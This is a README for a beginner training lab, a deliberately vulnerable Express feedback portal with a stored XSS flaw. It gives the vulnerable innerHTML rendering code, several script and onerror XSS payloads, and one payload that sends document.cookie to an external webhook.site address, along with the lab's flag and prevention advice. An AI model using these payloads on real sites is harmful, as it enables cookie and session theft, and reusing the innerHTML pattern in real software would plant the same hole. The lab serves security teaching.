# Lab 02 — Stored XSS (Express)

## Title
**Feedback Portal** — a vulnerable feedback collection app

## Difficulty
🟢 **Beginner** (Estimated solve time: 15–30 minutes)

## Learning Objectives
By completing this lab you will be able to:
- Identify **Stored (Persistent) Cross-Site Scripting (XSS)** vulnerabilities.
- Understand how `innerHTML` renders attacker-controlled HTML as live DOM.
- Craft basic XSS payloads that execute in a victim's browser.
- Exfiltrate sensitive data (cookies, tokens) via injected JavaScript.
- Apply output encoding, sanitization, and Content-Security-Policy as defenses.

## Technology Stack
| Layer     | Technology                          |
|-----------|-------------------------------------|
| Backend   | Node.js + Express 4                 |
| Storage   | In-memory array (resets on restart) |
| Frontend  | HTML + CSS + Vanilla JavaScript     |
| Web server| Nginx (Alpine)                      |
| Containers| Docker + Docker Compose             |

## Folder Structure
```
Lab-02-XSS-Express/
│
├── backend/                  # Express API — stores feedback in memory
│   ├── package.json          # Node dependencies
│   ├── server.js             # REST endpoints (no input sanitization)
│   └── Dockerfile            # Node 20 Alpine image
│
├── frontend/                 # Static site served by Nginx
│   ├── index.html            # Home (feedback form) + Admin panel views
│   ├── style.css             # UI styling
│   ├── app.js                # Form logic + VULNERABLE innerHTML rendering
│   └── Dockerfile            # Nginx Alpine image
│
├── docker-compose.yml        # Orchestrates both services
├── .env.example              # Environment variable reference
└── README.md                 # This file
```

## Challenge Story
A startup built a quick feedback portal so customers could share suggestions.
The admin panel was added in a hurry — feedback entries are rendered with
`innerHTML` to "support rich text." No one thought about security.

Your goal: inject a stored XSS payload through the feedback form and prove
code execution in the admin panel.

## Vulnerability Description
1. User submits **Name** and **Feedback** via the home page form.
2. The Express backend stores both fields **verbatim** in an in-memory array.
3. The **Admin Panel** fetches all entries and builds an HTML string:
   ```js
   container.innerHTML = items.map(item => `
     <strong>${item.name}</strong>
     <div>${item.feedback}</div>
   `).join('');
   ```
4. Because `innerHTML` parses and executes embedded HTML/JavaScript, any
   `<script>` tags or event handlers in stored feedback run immediately
   when an admin opens the panel.

This is **CWE-79: Cross-site Scripting (Stored)** — **OWASP A03:2021 Injection**.

## Hidden Flag
```
FLAG{stored_xss_master}
```
The flag is set as a **non-HttpOnly cookie** (`flag=FLAG{stored_xss_master}`)
when the Admin Panel loads. It is never displayed in the UI — you must steal
it via XSS (e.g., `document.cookie`).

## Setup

### Prerequisites
- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installed and **running**

### Build & Run
```bash
cd Lab-02-XSS-Express
docker compose up --build
```

### Access
| Page          | URL                        |
|---------------|----------------------------|
| Home (form)   | http://localhost:8082      |
| Admin Panel   | http://localhost:8082 → click **Admin Panel** |
| Backend API   | http://localhost:4002/api/health |

### Stop
```bash
docker compose down
```

## Exploitation Steps

### Step 1 — Confirm the app is running
Open http://localhost:8082. You should see the feedback form.

> **Connection refused?** Docker Desktop is not running, or you haven't
> started the containers. Run `docker compose up --build` first.

### Step 2 — Submit benign feedback
Fill in Name: `Test` and Feedback: `Hello world`. Submit and confirm success.

### Step 3 — Confirm HTML injection
Submit feedback with:
```html
<b>I can inject HTML!</b>
```
Open the **Admin Panel** — the text appears **bold**, confirming `innerHTML`
rendering without encoding.

### Step 4 — Execute stored XSS
Submit this payload in the **Feedback** field:
```html
<script>alert(document.cookie)</script>
```
Open (or refresh) the **Admin Panel**. An alert box should appear showing:
```
flag=FLAG{stored_xss_master}
```

### Step 5 — Alternative payloads
Event-handler based (works when `<script>` tags are filtered):
```html
<img src=x onerror="alert(document.cookie)">
```

Exfiltrate to an external webhook:
```html
<img src=x onerror="fetch('https://webhook.site/YOUR-ID?c='+document.cookie)">
```

Inject via the **Name** field (also rendered unsafely):
```
<img src=x onerror=alert(1)>
```

## Expected Solution
Submit stored XSS via the feedback form → open Admin Panel → JavaScript
executes → capture `FLAG{stored_xss_master}` from `document.cookie`.

## Prevention

### 1. Never use `innerHTML` for user content
```js
// Vulnerable
el.innerHTML = userInput;

// Safe — treat content as plain text
el.textContent = userInput;
```

### 2. Sanitize if HTML is required
Use [DOMPurify](https://github.com/cure53/DOMPurify):
```js
el.innerHTML = DOMPurify.sanitize(userInput);
```

### 3. Content-Security-Policy (CSP)
Block inline scripts even if XSS is injected:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 4. HttpOnly cookies
Store sensitive tokens in `HttpOnly` cookies so `document.cookie` cannot
read them from JavaScript.

### 5. Encode on output
Always HTML-encode (`&`, `<`, `>`, `"`, `'`) before inserting into templates.

### 6. Use framework auto-escaping
React, Vue, and Angular escape by default. Avoid `dangerouslySetInnerHTML`
(React) or `v-html` (Vue) without sanitization.

## Troubleshooting

| Symptom | Likely cause | Fix |
|---------|-------------|-----|
| `ERR_CONNECTION_REFUSED` on :8082 | Containers not running | Start Docker Desktop, run `docker compose up --build` |
| `docker: command not found` | Docker not installed | Install Docker Desktop |
| Admin panel shows "Network error" | Backend not ready | Wait a few seconds, click Refresh |
| XSS alert doesn't fire | Payload in wrong field, or browser blocked it | Try `<img src=x onerror=alert(1)>` instead |

## API Reference

| Method | Endpoint        | Description              |
|--------|-----------------|--------------------------|
| GET    | `/api/health`   | Health check             |
| POST   | `/api/feedback` | Submit feedback `{name, feedback}` |
| GET    | `/api/feedback` | List all feedback entries |
